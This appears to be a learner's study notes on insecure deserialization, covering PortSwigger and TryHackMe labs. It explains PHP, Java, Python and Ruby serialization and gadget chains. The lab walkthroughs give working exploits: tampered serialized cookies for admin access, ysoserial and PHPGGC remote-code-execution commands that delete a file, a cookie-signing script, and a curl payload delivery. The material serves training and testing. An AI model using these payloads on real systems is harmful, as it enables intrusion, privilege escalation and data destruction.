---
layout: default
title: "Insecure Deserialization"
parent: "Web Application"
nav_order: 17
---

**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes
- Similar to encoding but more focused on complex structures where encoding might be a step in the process
- Also called marshalling in Ruby or pickling in Python

Identifying:
PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. 
- Ex - consider a `User` object with the attributes:
	- `$user->name = "carlos"; $user->isLoggedIn = true;`
- When serialized, this object may look something like this:
	- `O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}`
- This can be interpreted as follows:
	- `O:4:"User"` - An object with the 4-character class name `"User"`
	- `2` - the object has 2 attributes
	- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
	- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
	- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
	- `b:1` - The value of the second attribute is the boolean value `true`

Java - uses binary serialization
- serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.

## Magic Methods
Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs.
- Ex: `__construct()`
- Can become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object
- some languages have magic methods that are invoked automatically **during** the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.


## Injecting arbitrary objects
[Check it](#lab-arbitrary-object-injection-in-php)

## Gadget Chains
A "**gadget**" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal.
- A gadget chain is **not** a payload of chained methods constructed by the attacker. *All of the code already exists on the website.*
- This is typically done using a magic method that is invoked during deserialization, sometimes known as a "kick-off gadget".
- Manually identifying gadget chains is *almost impossible without source code access*.

### ysoserial
In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example:
```
java -jar ysoserial-all.jar \ 
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ 
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ 
--add-opens=java.base/java.net=ALL-UNNAMED \ 
--add-opens=java.base/java.util=ALL-UNNAMED \ [payload] '[command]'
```

Not all of the gadget chains in ysoserial enable you to run arbitrary code. Instead, they may be useful for other purposes. For example, you can use the following ones to help you quickly detect insecure deserialization on virtually any server:
- The `URLDNS` chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in *any known Java version*. This makes it the **most universal** gadget chain for detection purposes. If you spot a serialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. 
- `JRMPClient` is another **universal** chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address *rather than a hostname*. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, ==this indicates that the gadget chain worked== because the server tried to connect to the firewalled address.

### PHP Generic Gadget Chains
Most languages that frequently suffer from insecure deserialization vulnerabilities have equivalent proof-of-concept tools. For example, for PHP-based sites you can use "PHP Generic Gadget Chains" (**PHPGGC**).



# Labs
## Lab: Modifying serialized objects
Cookie decodes with base64 to `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
- Change to: `s:5:"admin";b:1;` to represent admin user
- Send with **each** request (`my-account` -> `change-email`, -> `admin`) before deleting

## Lab: Modifying serialized data types
- Capture the session cookie and send to decoder
- URL decode then base64 decode and get:
- `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pdwvn2dsfs6ly4h9mbhjnh5i29otiask";}`
- change to `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
	- username is string 13 for administrator and access token type is changed to `i` for integer and `0` so it evaulates `true`
- Use this session cookie to access the `/admin` page

## Lab: Using application functionality to exploit insecure deserialization
Key thing here is **to edit the serialized data from Inspector in Repeater and click Apply Changes**
It looked like this: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwZHd2bjJkc2ZzNmx5NGg5bWJoam5oNWkyOW90aWFzayI7fQ%3d%3d` which after URL and base64 decoding returns this:
`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jandg58ig48rpzrf1dy4lhnw4ltvlyos";s:11:"avatar_link";s:19:"users/wiener/avatar";}`
- just need to change to `s:23:"/home/carlos/morale.txt"` and then `**Apply changes**`
- *I tried to do it all in decoder, but it didn't want to work*
	- Also no need to change the user parameter

## Lab: Arbitrary object injection in PHP
Straight up, I'm not gonna get this

1. Log in and notice the session cookie contains a serialized PHP object.
2. From the site map, notice that the website references the file `/libs/CustomTemplate.php`.
3. In Burp Repeater, ==notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.==
4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.
5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:
    `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
6. Apply changes in the decoder (base64 and URL encode)
7. Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos's file.

## Lab: Exploiting Java deserialization with Apache Commons

Requires `ysoserial-all.jar`
```
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
Didn't work with the suggested command, probably had something to do with weird spaces
Guidance is Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater, then run the command above and use the output as the session cookie. 

## Lab: Exploiting PHP deserialization with a pre-built gadget chain
**PHPGGC**

Another pretty rough one. I found the `/cgi-bin/phpinfo.php` file, but it says Zend, and the error message if you change a cookie says `Symfony 4.3.6`, but I didn't get that one. 
- Run `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`
- ==You also need a ==**SECRET_KEY**==from the phpinfo file.==
- Then create and run this script:
```php
<?php
$object = "<output of above command>";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie; 

```
That is the cookie. You replace it, and there's an error, but refresh and then it works. 

## Lab: Exploiting Ruby deserialization using a documented gadget chain
Uses [this](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) deserialization script, but I couldn't get ruby working so I had to run it in docker without internet. 
- `docker run -it --rm --network none -v $(pwd):/work -w /work ruby:3.0 bash`
- `ruby script.rb`
- Replacing `id` with `rm /home/carlos/morale.txt` of course
- Then replace the base64 output with the session cookie in any request

---

## Additional Deserialization Concepts (THM)

### Serialization Formats

#### PHP
Uses the `serialize()` function. Example:
```php
$note = new Notes("Welcome to THM");
$serialized_note = serialize($note);
// Output: O:5:"Notes":1:{s:7:"content";s:14:"Welcome to THM";}
```
- `O:5:"Notes":1:` — object of class **Notes** with one property
- `s:7:"content"` — property name "content" (length 7)
- `s:14:"Welcome to THM"` — property value (length 14)

PHP may call `__sleep()` before serialization and `__wakeup()` upon deserialization.

#### Python
Uses the `Pickle` module. Serialized data is binary, so base64 encoding is used for safe transport:
```python
import pickle
import base64

# Deserializing:
notes_obj = pickle.loads(base64.b64decode(serialized_data))

# Serializing:
pickled_content = pickle.dumps(notes_obj)
serialized_data = base64.b64encode(pickled_content).decode('utf-8')
```

#### Other Languages
- **Java**: Uses the `Serializable` interface; objects converted to byte streams for network communication and data persistence
- **.NET**: Uses `System.Text.Json` for JSON serialization or `System.Xml.Serialization` for XML
- **Ruby**: Uses the `Marshal` module; YAML used for more human-readable formats

### Identification
If you have source code access, look for: `serialize()`, `unserialize()`, `pickle.loads()`.

Without source code, check for:
- Error messages in server responses
- Inconsistencies in application behavior
- Cookies with base64-encoded values
- ASP.NET `__VIEWSTATE` fields (base64 encoded)

### PHPGGC Usage (Extended)
1. Search for available gadget chains: `php phpggc -l $term` (e.g., `laravel`)
2. Create a base64-encoded payload: `php phpggc -b Laravel/RCE3 system whoami`
3. Check browser storage for relevant tokens (e.g., `XSRF-TOKEN`)
4. Send payload via curl: `curl IP:PORT -X POST -H 'X-XSRF-TOKEN: $base64Payload'`

### Misc
Access backup PHP files by appending a `~` to the filename:
- `http://10.10.242.219/who/index.php~`